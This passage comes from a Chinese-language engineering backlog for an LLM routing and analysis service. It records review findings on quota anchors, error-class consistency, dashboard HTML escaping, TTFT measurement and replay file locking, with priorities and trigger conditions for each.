- **决定**：登记待办，不列入当前批次；有余力时加 `(?:$|[^A-Za-z0-9_-])` 一类右边界并
  重新校准。

#### 2.176 [低，顺手改，不做专项] `internal/guard` 系代码注释里散布着少量设计过程叙事，量化"密度是全仓两倍"的说法不成立

- **重新核实的量化数据**：按"以 `^\s*//` 起始的行数 / 总行数"统一口径重新逐文件
  测量：`guard.go` 56%、`fingerprint.go` 62%、`rules.go` 56%、`prefilter.go` 44%、
  `toolinspect.go` 44%、`outbound.go` 39%、`inbound.go` 39%、`engine.go` 35%、
  `runes.go` 36%、`walk.go` 31%、`sanitize.go` 30%（均值约 42%）；同仓对照样本
  `audit/audit.go` 43%、`router/router.go` 35%、`server/server.go` 34%、
  `report/aggregate.go` 29%（均值约 35%）。差距是真实存在但温和的（约 1.2 倍，
  且 `audit.go` 单文件的密度已经追平多数 guard 文件），"约为全仓两倍"这个说法在
  同一套测量口径下不成立——原说法的分母/分子统计方式与此处不同，具体差异未知，
  不再采信原数字。
- **质化层面的真实内核**：`grep` 统计 `internal/guard`/`internal/probe/guard.go`/
  `internal/report/guardscan.go`/`internal/router/guard.go` 里 ADR/R-N/K-Gx 一类
  交叉引用标号确认命中 67 处，其中绝大多数是"指向决策编号"的合法简短 why 指针
  （如 `(ADR-15)`），与本文件自己"引用而不重复"的约定同构，不算叙事；但确实存在
  少量（6 处）纯叙事性描述——"the mistake both prior drafts of this design made"
  （`guard.go:83`）、"an earlier version of this file did"（`walk.go:34`）、
  4 处"independent review finding"（`router/guard.go`、`report/guardscan.go`、
  `probe/guard.go` ×2）——这些是开发过程旁白，不是约束本身，读者不需要知道"上一版
  怎么写的"才能理解当前代码为什么这样写。
- **决定**：不做专项清理（大动作、零功能收益）；后续任何触碰这些文件的改动顺手把
  纯叙事性描述改写为直陈"why"，新增代码一律按 terse 风格，不引入新的叙事性注释。

### H. 2026-09-11 全系统 Review 新增（来源：`PROJECT_REVIEW_REPORT_agent_2026-09-11.md` 阶段二/三，源码已核实）

> 本条组由全系统 Review 的 6 路 subagent 发现、主控源码交叉核实后登记。凡与既有 §2 条目重复的（如 §2.86 respnorm 保活帧、§2.57 computeTimeSplit、§2.69 searchableTranscript、§2.100 token 双路径、§2.77 NaN 防御、§2.49 imgprep 溢出）不再重复登记，仅复核一致性后维持原编号。
>
> **2026-09-11 复核后续**（详见 `PROJECT_REVIEW_REPORT_agent_2026-09-11.md` 附录 A）：11 项已修并从本清单移除（编号不再复用）——顺手批 `2.106`（/log 写超时）、`2.108`（zstd 限并发）、`2.112`（buildGraph tie-breaker）、`2.113`（明细索引原子落盘）、`2.117`（tailPrev 死字段）、`2.118`（replay 前导空白）、`2.123`（rt.ctx 同步）；批次 1 `2.107`（/reports 热重载联动）、`2.110`（tailSlack 修正）、`2.114`（LLM 锚点长度门槛）、`2.116`（linkCompactions needle 门槛）。`2.111` 复核结论改为**明确不补**（见其条目）。

#### 2.111 [低，潜在路径，决定不补] `taskseg.Generic` 缺失 Anthropic tool_result 过滤

- **现状**：`internal/taskseg/generic.go` 的 `RealUserText` 对非空文本直接返回 true；Anthropic 协议将 tool_result 置于 user 角色消息，通用 Profile 下工具轮次会被误切为新任务。
- **裁决（2026-09-11 复核，不补）**：**现有组装根（`resolveTaskProfile`/`report.BuildCached`）一律硬编码 `OpenClawAware`，`Generic` 生产完全不可达**——给一条零执行可能的路径加防御代码 + 测试正是 YAGNI 反对的过度设计。且真到启用 Detect-based profile 调度那一步，必然要系统性重审 `Generic` 的全部启发式（不止 tool_result 一处），届时一并处理更合理。§1.3「尤其不做 `prof == nil` 就回退到 `Generic` 这类静默兜底」的裁决同源。
- **触发条件**：启用 Detect-based profile 调度（届时重审 `Generic` 全部启发式）。

#### 2.120 [低] `core.PricingSpec/Rate/PricingOverride` 职责漂移

- **现状**：实时路由已完全剔除定价，但定价契约仍滞留 `core` 叶子包（与 `internal/pricing.Rate` 双重定义并存），违反 core 包文档的“最小充分集”准入声明。
- **可能方案**：下沉到 `internal/pricing` 包，消除类型冗余。
- **ROI**：Return=core 准入纯度；Investment=跨包移动——架构演进期做，不单独立项。

#### 2.122 [低] `sticky` 满容量驱逐为持锁 O(N) 线性扫描

- **现状**：`internal/sticky/sticky.go` 满容量时在 `mu` 下 for-range 找最老条目（maxEntries=10000 时每次 O(10000)）。
- **可能方案**：map + doubly-linked list 实现 O(1) LRU。
- **触发条件**：并发活跃会话接近 maxEntries 时（当前 μs 级非瓶颈）。

#### 2.124 [低] `expandEnv` 在 YAML flow-style 集合语法下存在逗号注入残存边界

- **现状**：`internal/config/config.go` 注释已承认：`api_keys: [${VAR}]` 若环境变量含逗号可能分割出额外元素；生产与推荐配置一律使用 block 语法，当前拦截已满足安全边界。
- **可能方案**：YAML Node 树反序列化后再做标量展开。
- **ROI**：低——可暂不处理，登记防回归。

#### 2.125 [低，登记待触发] `dataFieldMarkers` 只匹配紧凑 JSON，pretty-printed 请求体的附件 payload 会被整段当文本估算

- **现状**：`internal/server/facts.go` 的四个 data-field marker（`"data":"` / `"file_data":"` / `"url":"data:` / `"image_url":"data:`）都假设冒号后无空格的紧凑序列化。pretty-printed 请求体（`"data": "<base64>"`）一个 marker 都匹配不上 → span 不建立 → 整段 base64 payload 落进 `estimateTextTokens` 按文本计权（400KB 图 ≈ 85K 幻影文本 token，比 §2.109 修掉的双重计费更差）。§2.109 修复的分型嗅探本身不受影响——紧凑 body 里 media_type 的值引号始终紧贴 `image/`。
- **为什么待定**：主流 SDK 一律发送紧凑 JSON（带内联附件还做 pretty-print 的形态至今为零）；marker 改为空白容忍匹配要动热路径扫描循环的字节匹配结构，复杂度不小。Span 建立失败的后果也只落在 degraded 扣费估算与 `WithinContext` 软重排，方向保守。
- **触发条件**：`vmr analyze` 的 `requests/index.json` 出现"请求体含缩进/换行的附件 payload"的记录（即真实流量中出现 pretty-printed 附件请求），或 profile 显示 facts 提取对真实负载失真。

### I. 2026-09-11 第二轮 Review 新增（来源：`PROJECT_FULL_REVIEW_REPORT`/`ROUTING_ARCHITECTURE_REVIEW`/`ANALYZE_REVIEW_REPORT` 三份独立报告，逐条源码核实与裁决后登记）

> 三份报告合计约 45 条 finding，经源码核实：3 条是报告自身的事实性错误（对 Go regex 行为理解有误、误判 recover 机制不存在、误判"探针成功即放行"的方案是新提案而非早已被 §1.1/§2.85 否决的方案）、约 20 条属实且方案无争议已直接修复（含本节以下未直接列出的：D1-F03 probe.go 读取错误处理、D2-F02 capabilities 白名单校验、D2-F03 协议空端点组校验、D2-F04 health.go 文档注释、D2-F05 短 key 脱敏、D2-F06 Responses 探针输出上限、D2-F09 负数请求体上限校验、D3-F01 quota 独立 flock、D3-F04 livestats 死变量、D4-F01 ReqCoord 数值排序、D4-F03 详单页 UsageSides、D4-F04/D4-F05 chatmsg 两处、D5-F01/D5-F02/D5-F04/D5-F05/D5-F06 journey/report 五处、GAP-02 资产路径守卫、GAP-08 compare 初始指令合并——详见对应 commit），其余按 ROI 排入下表或链接到既有条目。**不成立、已被既有 §1 裁决覆盖、或改动会制造回归的 finding 均未采纳**，不在此重复列出理由（结论已写回对应 §1 条目或本文件之外的 review 记录）。

#### 2.127 [中，需先设计] 裸时钟 `since` 的周期锚点未持久化，命中非整除 24h 的窗口（如 Claude 套餐 5h 滚动）时跨重启漂移

- **现状**：`internal/config/quota.go` 的 `parseSince` 对裸时钟（`since: "08:00"`，无日期）以当前系统日期构造锚点；月度/日度锚点因强制要求完整日期（`YYYY-MM-DD`/RFC3339）不受影响。真正受影响的是 `every` 不能整除 24h/1440min 的窗口——**恰好是 Anthropic Claude Code Pro/Max 的真实 5 小时滚动套餐**（`internal/quota/period.go` 的 `PeriodStart`）。服务在窗口中途重启，裸时钟按当前日期重新解析出的锚点会把 `PeriodStart` 判定为已前进（`ps > PeriodStart`），导致 `resetIfStaleLocked` 把这一窗口的已用量清零，实际额度被欠记。
- **可能方案**：无日期裸时钟首次运行时把绝对锚点（含年/月/日）固化进 `vmr-quota.json`；重启加载时若账本已有该 limit 的 anchor 则沿用，不随当前自然日重算。
- **为什么需要先设计**：改动涉及 `vmr-quota.json` 结构演进（新增 per-limit anchor 字段）与 `resetIfStaleLocked` 判定逻辑，需要一套新的 cold/warm 一致性测试，不是局部改动。
- **触发条件**：已触发（配置 `every: 5h` 一类非整除窗口 + 服务重启即可复现），排入批次 1。

#### 2.128 [中] journey 与 report 两半区对同一请求的 ErrorClass 取值口径不一致

- **现状**：`internal/journey/journey_stepfacts.go` 取一个请求多次 attempt 中第一个非空的 ErrorClass；`internal/report/recextract.go` 经 `reqdetail.AttemptErrorClass` 取最后一个 attempt，且带有 `ErrorClass` 为空时按 `Error` 前缀解析的 fallback，journey 侧没有这层 fallback。取最后一个 attempt 更能反映请求的终态退出原因。
- **可能方案**：journey 侧改为调用同一个 `reqdetail.AttemptErrorClass`（对最后一个 forwarded/非空 attempt），两侧共用同一函数，补一条 journey vs report 的差分测试锁死一致性——与「一个分析数字复现一个路由数字必须差分测试锁定」的既有纪律同型。
- **为什么待定**：journey 侧改动会牵动 Context Rot / N-gram / benchmark 等下游指标口径，需同步更新 golden fixture，不是两行改动。
- **触发条件**：已触发（两侧口径已确认不一致），排入批次 1。

#### 2.129 [中] 宏观报表头部的自流量排除说明位置过深，顶部记录数与摘要请求数出现无声断层

- **现状**：`internal/report`（`viewmodel_doc.go`）报表头部 meta 行只打印原始记录数（如 15946），自流量排除的说明（`AppendixSelfTrafficExcluded`）被安排在报表最后一节——一份长报表里，读者要翻到全文最底部才能看到「为什么第二行的请求数比第一行少了 545」。`macro/summary.json` 的 `meta.self_traffic_excluded` 字段本身完整，纯粹是呈现位置问题。
- **可能方案**：把排除计数就近内联到头部 meta 行（如「15946 条记录（含 545 条分析自流量已自动排除，有效请求 15401 条）」），不需要新逻辑，只是渲染位置调整。
- **为什么待定**：会牵动头部 meta 行与末尾附录两处的 golden fixture。
- **触发条件**：已触发（真实报表已复现「看起来漏算」的误读），排入批次 1。

#### 2.130 [低，登记待办] `journey-viewer.html` 超长任务缺 Task 级折叠大纲，长文本硬截断无展开入口

- **现状**：看板对 251 步一类的长任务从头到尾平铺全部 Step 卡片，翻阅困难；`why.slice(0, 600)`/`(0, 1500)` 硬截断推理过程与长回复，页面上没有任何"展开全文"按钮或 modal，只能退出网页去翻底层 JSON。这是现有能力的可用性缺陷（不是从未做过的新交互），与 §2.94/§2.95 同属看板体验债。
- **可能方案**：左侧 Task 大纲（sticky nav）+ 右侧时序主窗格，截断处加 `[+ 展开全文]`；需要把骨架页数据加载/渲染重构为显式函数（与 §2.94 的 `wireHashReload` 重构可能共享一部分工作量）。
- **Markdown 侧等价症状（2026-09-12 review）**：`journeys/index.md` 的 633 行明细大表无节标题、顶部无分组锚点目录，⚠/⚡ 图例压在文件末尾（读到表尾才知其义）；`j-*.md` 长任务（实测 11254 行 / 37 任务 / 365 步）无 t-turn 锚点目录，⚠️/🔷 徽标全文无图例。修复与本条的 viewer 大纲同属一次渲染层改动，可共享工作量。
- **触发条件**：作为看板体验专项排期处理，与 §2.94/§2.95 一起评估。

#### 2.131 [低，非活跃] `ctxgraph.fastRawDigest` 的 default 分支把未知类型折叠为同一常量键，但该分支当前不可达

- **现状**：`internal/ctxgraph/manifest.go` 的 `fastRawDigest` 对非 string/map/[]any/float64/bool/nil 类型统一返回 `0xdeadbeef` 常量指纹。核实其唯一输入源（`BuildManifest` 经标准 `encoding/json.Unmarshal`，未启用 `UseNumber`）只产生前述已处理的类型集合，default 分支目前是死代码。
- **为什么非活跃**：给一条当前零执行可能的路径加防御代码正是 YAGNI 反对的过度设计（同型于 §2.111 的裁决逻辑）。
- **触发条件**：解析链路引入 `json.UseNumber` 或新的第三方反序列化器，使 default 分支变为可达路径时，改用类型名+反射字符串做动态哈希。

#### 2.132 [低，登记待办] livestats 崩溃恢复的 catch-up 重滚存在旧数据反向覆盖，根因是 `deleteSlim` 失败被静默吞掉

- **现状**：`internal/livestats/aggregator.go` 的 `deleteSlim(a.dir, name)` 返回值被直接丢弃（两处调用点）。真实触发需要两个条件同时成立：① 某小时 slim 文件已卷入 rollup 但 `deleteSlim` 失败（文件永久滞留、无任何告警）；② 之后又发生跨小时边界的迟到样本追加。此时重启会用遗留 slim 重新生成一条更旧更小的聚合行，last-wins 语义下覆盖更新的累计值。
- **可能方案**：先给 `deleteSlim` 失败补一条 WARN（当前完全不可观测），完整修复（避免覆盖）需要更谨慎的设计（取较大值或落一个"已 roll"标记）——livestats 是零依赖叶子包，目前没有任何日志钩子，加一条 WARN 本身需要先决定要不要为此引入一个可选 logger 字段，不是一行改动。
- **触发条件**：作为 `/stats` 展示准确性专项排期；影响面仅限统计展示，不触达计费/路由。

#### 2.133 [低] `attachmentSpans` 的 marker 可能匹配非附件字段中的同名 key

- **现状**：`internal/server/facts.go` 的 `attachmentSpans` 在整个请求体扫描 `"data":"` 等标志，不检查 JSON 结构层级；一段普通业务文本或自定义 metadata 若恰好包含 `"data":"..."`，会被误标记为附件 span。核实影响面：只喂给 token 估算（`estimateTextTokens`/`estimateDocumentTokens`），不触达路由决策或安全边界，最坏后果是把一段文本从"按文本计权"错分到"按文档计权"。
- **性质**：与 §1.4 `imgprep.HasImageMarker`"宁误报不漏报"的既有取舍同源——本项目已接受这类启发式扫描的边缘误判。
- **触发条件**：`vmr analyze` 的估算精度专项排期时一并评估，不单独立项。

### J. 2026-09-11 第三轮 全系统深度 Review 新增（来源：full-review 6 域自底向上与跨域核实，源码已确认）

> 由 full-review 6 路并行 subagent 自底向上深度审阅 + 主控横向跨域链路交叉核实后确认登记。全部条目已核实当前代码锚点，无重复登记。

#### 2.135 [中，建议尽快] `internal/dashboard` 的 `macro-dashboard.html` 动态审计日志字段内联 innerHTML 缺少 `esc()` 转义

- **现状**：`internal/dashboard` 的资源模板 `assets/macro-dashboard.html` 多处动态日志字段（如 `m.model`、`c.client_key`、`q.provider`、`e.endpoint`、`s.highlights` 等）未经 `common.js` 的 `esc()` 转义直接拼入 `innerHTML`。其它页面（如 `status.html`）均对动态内容做了严格 HTML 转义。恶意或异常的 upstream 模型名/客户端标识可能导致 DOM XSS。**2026-09-12 review 复核**：该问题在当前产物仍在；共享运行时 `svgBarChart`/`svgLineChart` 的 `${shortLabel}` 与 `<title>${label}`（模型/端点名）同样未转义。修复范围按「全部 innerHTML 插值统一过 esc()（含 SVG title/text）」处理。
- **可能方案**：在 `macro-dashboard.html` 各处模板插值及共享 SVG 助手中补充 `esc(...)` 过滤。
- **ROI**：高。纯前端防守，零后端依赖，消除安全隐患。

#### 2.136 [低] `recorder.Write` 的 `ttftMS` 哨兵在亚毫秒首包下被后续 chunk 覆盖

- **现状**：`internal/server/recorder.go:61` 中使用 `if r.ttftMS == 0 && len(p) > 0` 判定首包写入。当首包响应极快（耗时 < 1ms，`Milliseconds() == 0`）时，哨兵未能有效锁死，第二个 chunk 到达时（如 50ms）条件依然满足，导致真正的首字节时延被后续 chunk 覆盖放大。
- **可能方案**：增加 `firstByteSeen bool` 字段并在首次 `len(p) > 0` 时置为 true，替代 `ttftMS == 0` 作为首包判定守卫。
- **ROI**：中。改动 3 行，提升本地与微秒级响应下的 TTFT 统计准确性。

#### 2.137 [低] `chatmsg.MsgOffset` 在 `system` 与 `instructions` 并存时偏移量少计 1 位

- **现状**：`internal/chatmsg/messages.go:159` 的 `MsgOffset` 若同时存在 `system` 与 `instructions` 字段时返回 1；而同文件 `Messages(body)` 在两键并存时会先后 append 两条合成消息，导致 `ri := i - off` 索引对齐产生 1 位偏移。
- **可能方案**：`MsgOffset` 改为累加形式（两键分别判定并 `off++`）。
- **触发条件**：低优。虽然极少在单一请求体中同时混用两者，但两函数间语义应当保持绝对自洽。

#### 2.139 [低] `replay -record` 写入绕过 audit log_dir 的 flock 独占写约定

- **现状**：`internal/replay/replay.go:668` 对 `-record` 路径使用裸 `O_APPEND` 写入，未检查 `audit.DirLockOccupier`。当用户把 `-record` 指向当前运行实例正在写入的日志文件时，打破了 flock 独占写约定。
- **可能方案**：写入前若检测到目标在 log_dir 内且服务在线，输出 WARN 或拒绝写入。
- **ROI**：低。边缘运维场景加固。

---

## 3. 跨组排期结论

- **全局结论**：待办里没有「价值高、成本低、却一直没做」的异常。值得优先投入的集中在三类：大语料规模（§2.2 看触发、§2.1 已证 5.2×）、LLM 解读层校准（§2.18，成本在人工标注）、路由配额（§2.52，用户 hold）。分析半区的产品路线（新视图 / 导出 / 达成信号）已移入 `ROADMAP`，不在此清单排期。
- **2026-09-11 全系统 Review 剩余项（复核后）**：11 项已修（顺手 7 + 批次 1 的 4，见 H 组顶部说明与 `PROJECT_REVIEW_REPORT_agent_2026-09-11.md` 附录 A）。剩余排期——批次 2 已全部落地（§2.109 / §2.115 / §2.119 移除）；**批次 3（需设计 / 待触发）**：§2.86、§2.100、§2.57；**批次 4（架构演进期 / 待触发）**：§2.120 / §2.122 / §2.124。§2.111 复核后改为明确不补；§2.125 为修复 §2.109 时新发现的登记待触发项。
- **2026-09-11 第二轮 Review（I 组）**：三份独立报告（路由半区架构、全系统 D1-D6、analyze 套件真实语料体验）逐条核实后，约 20 项事实清楚、方案无争议、改动可控的问题已在本轮直接修复并从待办移除（quota 独立 flock、ReqCoord 数值排序、详单页 UsageSides、capabilities 白名单校验等，见提交记录）；3 项核实为报告自身的事实性错误未采纳；剩余排入**批次 1（建议尽快，已触发）**：§2.127（quota 裸时钟锚点持久化）、§2.128（journey/report ErrorClass 口径统一）、§2.129（自流量排除说明前移）、§2.58(d)（客户端成本表补 `(no client_key)` 行）；**批次 2（登记待办）**：§2.130（journey-viewer 折叠/展开）、§2.132（livestats deleteSlim 告警）、§2.57 第二处表现（ModelToToolRatio clamp）；**非活跃/低优**：§2.131、§2.133、§2.126。
- **2026-09-11 第三轮 全系统 Review（J 组）**：6 路 subagent 深度只读核实 + 跨域链路拉通：**批次 1（建议尽快，T1）**：§2.135（macro-dashboard innerHTML esc 转义，仍待处理）；§2.134（runProbe 断流校验提前）已于 2026-09-13 修复并移除。**批次 2（登记待办，T2）**：§2.136（recorder TTFT 首包哨兵）、§2.137（chatmsg MsgOffset 累加）、§2.139（replay -record flock 守卫）；§2.138（坐标搜索路径收敛）与 §2.140（snapshot.go boolInt 死代码删除）已于 2026-09-13 修复并移除。
- **2026-09-12 analyze 套件 Review（本轮）**：全量 44 文件语料（15,946 条）生成默认套件（zh/en）+ `-journey`/`-compare`（含 LLM 解读）+ `-benchmark` 全套产物，主控 + 3 路只读 subagent（HTML 看板/双语对照/journey 叙事）审阅。**批次 1**：§2.135 复核仍存在且修复范围扩充（tool-waste/SVG 插值点）。**批次 2（登记待办）**：§2.94 / §2.130 / §2.57 各自的新症状扩充；§2.141–§2.144（B 组口径与呈现）、§2.148–§2.152（D 组产出契约与看板）。**LLM 解读层（与 §2.18 黄金样本校准同批）**：§2.145 / §2.146 / §2.147——本轮实测产出的负例样本可直接进校准集。双语 wall-clock 漂移（周期已过% 跨运行不一致）复核确认与 §1.5 既有取舍一致，未新增。
- **2026-09-15 Agent Guard 独立复核（R-1~R-17，G 组扩充）**：三个 S0（R-1 还原器跨字段
  ReplaceAll、R-2 分帧尾部/CRLF 旁路、R-3 跨事件转义域错配）与 R-4/R-6/R-8(a)(e)/R-9/
  R-10/R-11/R-12/R-13/R-14 已就地修复并附对抗性回归测试；R-7、R-16、R-17 所针对的入向
  在线拦截机制均已随 ADR-15（K-G15）整体移除，条目随之删除，不再保留编号占位；
  R-8(b)(c)(d) → §2.157 建档跟踪；R-5（Block/SanitizedRunes 盖章）、
  R-15（文档错误声明）随本轮修复闭环，R-15 的逐条修正已并入执行总报告 Final 2.0。
  **复核后续**：R-1/R-3/R-4/R-6 所针对的 restore 机器已随 `mode: replace` 整体移除
  （K-G1），R-16 一并失效。
- **多数条目不是「不值得做」，是「收益未经测量」**：§2.2 / §2.3 / §2.7 / §2.10 / §2.17 的共同点是收益尚未实测——而先做优化再测量正是这个项目一贯拒绝的顺序；触发条件到了先测再说。
- **触发即做**（成本主要等触发，触发条件写在条目里）：§2.2（上限 3 万条 / RSS 4GB，留两成提前量即约 2.5 万条 / 3.3GB 起排期）、§2.55（语料再涨约 5 倍）、§2.56（时间成首要痛点）、§2.48（词表互相干扰 / sticky 往返可观测）、§2.57（脚注不够用）、§2.58（主力上游长期无价）、§2.18（黄金样本窗口）、§2.99（灰区振荡在 5s 首档下仍规律复现，触发条件写在条目里）。
- **需要先设计**（价值高、易做错，禁止仓促）：§2.86 保活帧旁路。
- **明确不做**（各有量化触发条件，触发即重估）：§2.3 / §2.22 / §2.49 / §2.50 / §2.91 / §2.126 / §2.131。
